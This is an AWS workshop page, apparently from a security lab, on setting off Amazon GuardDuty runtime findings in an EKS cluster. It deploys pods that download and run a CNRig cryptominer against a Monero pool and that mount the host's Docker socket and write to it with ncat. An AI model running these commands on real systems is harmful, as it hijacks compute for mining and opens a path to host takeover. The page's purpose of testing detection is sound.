---
title : "Generate Kubernetes Findings using Kubectl in Cloud9 Instance"
weight : 23
---

In this section, we will generate some Kubernetes findings in your Amazon EKS cluster using your Cloud9 instance.

Go to your Cloud9 terminal and run the following commands to generate the sample findings.

### [`Execution:Runtime/NewBinaryExecuted`, `Impact:Runtime/CryptoMinerExecuted` and `CryptoCurrency:Runtime/BitcoinTool.B!DNS`](https://docs.aws.amazon.com/guardduty/latest/ug/findings-eks-runtime-monitoring.html)


The finding `Execution:Runtime/NewBinaryExecuted` means **A newly created or recently modified binary file in a container has been executed.**

The finding `Impact:Runtime/CryptoMinerExecuted` means **A container or an Amazon EC2 instance is executing a binary file that is associated with a cryptocurrency mining activity.**

The finding `CryptoCurrency:Runtime/BitcoinTool.B!DNS` means  **An Amazon EC2 instance or a container is querying a domain name that is associated with a cryptocurrency activity.**

Run the following in your terminal to create the YAML manifest that has a ClusterRole and a ClusterRoleBinding definition.

```bash
cd ~/environment
cat << EoF > ubuntunetcat.yaml
### Execution:Runtime/NewBinaryExecuted
### Impact:Runtime/CryptoMinerExecuted
### CryptoCurrency:Runtime/BitcoinTool.B!DNS

apiVersion: v1
kind: Pod
metadata:
  name: ubuntunetcat
  labels:
    app: ubuntunetcat
spec:
  containers:
  - image: redora/ubuntunetcat
    command:
      - "sleep"
      - "60000"
    imagePullPolicy: IfNotPresent
    name: ubuntunetcat
  restartPolicy: Always
EoF
```

Run the following command to deploy the pod.

```bash
kubectl apply -f ubuntunetcat.yaml
```

Run the following command to check if the pod is running.

```bash
kubectl get pod
```

::::expand{header="Check Output"}
```bash
WSParticipantRole:~/environment $ kubectl get pod
NAME                                            READY   STATUS    RESTARTS   AGE
ubuntunetcat                                    1/1     Running   0          32s
```
::::

Run the following command to exec into the above pod.

```bash
kubectl exec -it ubuntunetcat -- /bin/bash
```
Then execute the following commands inside the pod.

```bash
wget -O xmrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64
chmod +x xmrig
```

::::expand{header="Check Output"}
```bash
--2023-07-03 11:51:40--  https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64
Resolving github.com (github.com)... 192.30.255.112
Connecting to github.com (github.com)|192.30.255.112|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/128983339/a48be568-499e-11e8-824c-7aa62378d6b3?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230703%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230703T115140Z&X-Amz-Expires=300&X-Amz-Signature=297111c3371aa55b97ee80fc2b914f5cf92aa93fa82e8092b7d87741086a128d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=128983339&response-content-disposition=attachment%3B%20filename%3Dcnrig-0.1.5-linux-x86_64&response-content-type=application%2Foctet-stream [following]
--2023-07-03 11:51:40--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/128983339/a48be568-499e-11e8-824c-7aa62378d6b3?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230703%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230703T115140Z&X-Amz-Expires=300&X-Amz-Signature=297111c3371aa55b97ee80fc2b914f5cf92aa93fa82e8092b7d87741086a128d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=128983339&response-content-disposition=attachment%3B%20filename%3Dcnrig-0.1.5-linux-x86_64&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2731128 (2.6M) [application/octet-stream]
Saving to: 'xmrig'

xmrig                                100%[=====================================================================>]   2.60M  --.-KB/s    in 0.07s   

2023-07-03 11:51:40 (38.7 MB/s) - 'xmrig' saved [2731128/2731128]

```
::::

Now, run the following command inside the Pod to trigger the Findings.

```bash
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u foo@yahoo.com -p x
```

The output from the above command will like below. Keep the command running.

```bash
root@ubuntunetcat:/# ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u foo@yahoo.com -p x
 * VERSIONS:     CNRig/0.1.5 libuv/1.20.0 gcc/7.3.0
 * CPU:          AMD EPYC 7571 (1) x64 AES-NI
 * CPU L2/L3:    0.5 MB/64.0 MB
 * THREADS:      2, cryptonight, av=1, donate=5%
 * POOL #1:      stratum+tcp://xmr.pool.minergate.com:45700
 * COMMANDS:     hashrate, pause, resume
[2023-07-03 11:51:55] [UP] Checking for updates
[2023-07-03 11:51:55] READY (CPU) threads 2(2) huge pages 0/2 0% memory 4.0 MB
[2023-07-03 11:51:55] [UP] This is the latest version.
[2023-07-03 11:52:59] speed 2.5s/60s/15m n/a n/a n/a H/s max: n/a H/s
[2023-07-03 11:53:59] speed 2.5s/60s/15m n/a n/a n/a H/s max: n/a H/s
[2023-07-03 11:54:05] [stratum+tcp://xmr.pool.minergate.com:45700] connect error: "connection timed out"
[2023-07-03 11:54:59] speed 2.5s/60s/15m n/a n/a n/a H/s max: n/a H/s
[2023-07-03 11:55:59] speed 2.5s/60s/15m n/a n/a n/a H/s max: n/a H/s
[2023-07-03 11:56:20] [stratum+tcp://xmr.pool.minergate.com:45700] connect error: "connection timed out"
[2023-07-03 11:56:59] speed 2.5s/60s/15m n/a n/a n/a H/s max: n/a H/s
[2023-07-03 11:57:59] speed 2.5s/60s/15m n/a n/a n/a H/s max: n/a H/s
[2023-07-03 11:58:35] [stratum+tcp://xmr.pool.minergate.com:45700] connect error: "connection timed out"

```

Go back [AWS GuardDuty console]([console.aws.amazon.com/guardduty](https://us-west-2.console.aws.amazon.com/guardduty/home?region=us-west-2#/findings?macros=current)) and check that a finding is generated for this.

::alert[If the finding doesn’t appear immediateley in the GuardDuty Console, keep refreshing the page since it make take few minutes to to generate the Kubernetes Findings]{header="Note"}

You can find three findings in the Console.

![GDRunTime-3findings](/static/images/detective-controls/GDRunTime-3findings.png)

Click on any of the Findings to the details.

![GDRunTime-2of3](/static/images/detective-controls/GDRunTime-2of3.png)

### [`PrivilegeEscalation:Runtime/DockerSocketAccessed`](https://docs.aws.amazon.com/guardduty/latest/ug/findings-eks-runtime-monitoring.html#privilegeesc-runtime-dockersocketaccessed)

This finding means **A process inside a container is communicating with Docker daemon using Docker socket.**

From your terminal, run the command below to create the YAML manifest for the finding.


```bash
cd ~/environment
cat << EoF > docker-socket.yaml
### PrivilegeEscalation:Runtime/DockerSocketAccessed

apiVersion: v1
kind: Pod
metadata:
  name: docker-socket
  labels:
    app: docker-socket
spec:
  containers:
  - name: docker-socket
    image: amazonlinux
    command:
      - "sleep"
      - "60000"
    resources:
      requests:
        cpu: 100m
        memory: 100Mi
      limits:
        cpu: 200m
        memory: 200Mi
    volumeMounts:
    - mountPath: "/var/run/docker.sock"
      name: docker-socket
      readOnly: false
  volumes:
  - name: docker-socket
    hostPath:
      path: "/var/run/docker.sock"
EoF
```

Run the following command to deploy the pod.

```bash
kubectl apply -f docker-socket.yaml
```

Run the following command to check if the pod is running.

```bash
kubectl get pod
```

::::expand{header="Check Output"}
```bash
WSParticipantRole:~/environment $ kubectl get pod
NAME                                            READY   STATUS    RESTARTS   AGE
docker-socket                                   1/1     Running   0          6s
ubuntunetcat                                    1/1     Running   0          10m
```
::::


Run the following command to exec into the above pod.

```bash
kubectl exec -it docker-socket -- /bin/bash
```
Then execute the following commands inside the pod to install the [ncat utility](https://man7.org/linux/man-pages/man1/ncat.1.html).

```bash
yum -y install nmap-ncat
```

::::expand{header="Check Output"}
```bash
Amazon Linux 2023 repository                                                                                        12 MB/s |  14 MB     00:01    
Last metadata expiration check: 0:00:20 ago on Mon Jul  3 14:19:03 2023.
Dependencies resolved.
===================================================================================================================================================
 Package                         Architecture                Version                                        Repository                        Size
===================================================================================================================================================
Installing:
 nmap-ncat                       x86_64                      3:7.93-1.amzn2023                              amazonlinux                      226 k
Installing dependencies:
 libibverbs                      x86_64                      37.0-1.amzn2023.0.3                            amazonlinux                      397 k
 libnl3                          x86_64                      3.5.0-6.amzn2023.0.2                           amazonlinux                      330 k
 libpcap                         x86_64                      14:1.10.1-1.amzn2023.0.2                       amazonlinux                      173 k

Transaction Summary
===================================================================================================================================================
Install  4 Packages

Total download size: 1.1 M
Installed size: 2.9 M
Downloading Packages:
(1/4): nmap-ncat-7.93-1.amzn2023.x86_64.rpm                                                                        870 kB/s | 226 kB     00:00    
(2/4): libpcap-1.10.1-1.amzn2023.0.2.x86_64.rpm                                                                    625 kB/s | 173 kB     00:00    
(3/4): libibverbs-37.0-1.amzn2023.0.3.x86_64.rpm                                                                   1.1 MB/s | 397 kB     00:00    
(4/4): libnl3-3.5.0-6.amzn2023.0.2.x86_64.rpm                                                                      3.9 MB/s | 330 kB     00:00    
---------------------------------------------------------------------------------------------------------------------------------------------------
Total                                                                                                              1.8 MB/s | 1.1 MB     00:00     
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction
  Preparing        :                                                                                                                           1/1 
  Installing       : libnl3-3.5.0-6.amzn2023.0.2.x86_64                                                                                        1/4 
  Installing       : libibverbs-37.0-1.amzn2023.0.3.x86_64                                                                                     2/4 
  Installing       : libpcap-14:1.10.1-1.amzn2023.0.2.x86_64                                                                                   3/4 
  Installing       : nmap-ncat-3:7.93-1.amzn2023.x86_64                                                                                        4/4 
  Running scriptlet: nmap-ncat-3:7.93-1.amzn2023.x86_64                                                                                        4/4 
  Verifying        : nmap-ncat-3:7.93-1.amzn2023.x86_64                                                                                        1/4 
  Verifying        : libibverbs-37.0-1.amzn2023.0.3.x86_64                                                                                     2/4 
  Verifying        : libpcap-14:1.10.1-1.amzn2023.0.2.x86_64                                                                                   3/4 
  Verifying        : libnl3-3.5.0-6.amzn2023.0.2.x86_64                                                                                        4/4 

Installed:
  libibverbs-37.0-1.amzn2023.0.3.x86_64            libnl3-3.5.0-6.amzn2023.0.2.x86_64            libpcap-14:1.10.1-1.amzn2023.0.2.x86_64           
  nmap-ncat-3:7.93-1.amzn2023.x86_64              

Complete!
```
::::

Run the following command inside the Pod. Press Enter once again.

```bash
nc -lU /var/run/docker.sock &
```

::::expand{header="Check Output"}
```bash
[1] 31
bash-5.2# Ncat: bind to /var/run/docker.sock: Address already in use. QUITTING.

[1]+  Exit 2                  nc -lU /var/run/docker.sock
```
::::

Now, run the following command inside the Pod to trigger the Finding.

```bash
echo SocketAccessd | nc -w5 -U /var/run/docker.sock
```

::::expand{header="Check Output"}
```bash
Ncat: Connection refused.
```
::::

Go back [AWS GuardDuty console]([console.aws.amazon.com/guardduty](https://us-west-2.console.aws.amazon.com/guardduty/home?region=us-west-2#/findings?macros=current)) and check that a finding is generated for this.

::alert[If the finding doesn’t appear immediateley in the GuardDuty Console, keep refreshing the page since it make take few minutes to to generate the Kubernetes Findings]{header="Note"}

You can find the following findings in the Console.

![GDRunTime-2findings](/static/images/detective-controls/GDRunTime-2findings.png)

Click on any of the Findings to the details.

![GDRunTime-2of2](/static/images/detective-controls/GDRunTime-2of2.png)

